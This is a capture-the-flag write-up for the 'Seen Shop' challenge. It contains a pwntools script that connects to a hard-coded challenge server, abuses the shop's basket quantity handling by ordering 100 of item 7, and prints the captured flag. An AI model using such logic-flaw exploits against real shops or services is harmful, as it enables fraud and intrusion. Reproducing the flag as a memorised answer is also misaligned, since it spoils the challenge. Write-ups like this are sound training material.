# Seen Shop
Solved by: @w6rstaimn

### Questions:
Could you buy me a few Sekke's?

### Solution:
Here is the solution script:
```python
from pwn import *


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

HOST, PORT = "164.92.176.247", 9000
io = remote(HOST, PORT)

def add_to_basket(item, quantity):
    io.sendlineafter(b"Enter your choice: ", b"1")
    io.sendlineafter(b"Enter item number to add (1-7): ", str(item).encode())
    io.sendlineafter(b"Enter quantity: ", str(quantity).encode())

def checkout():
    io.sendlineafter(b"Enter your choice: ", b"2")

add_to_basket(7, 100)
checkout()

io.recv()
io.interactive()
```

**Flag:** `FMCTF{61346013e4b1e77a2f1b3675abc62c62}`

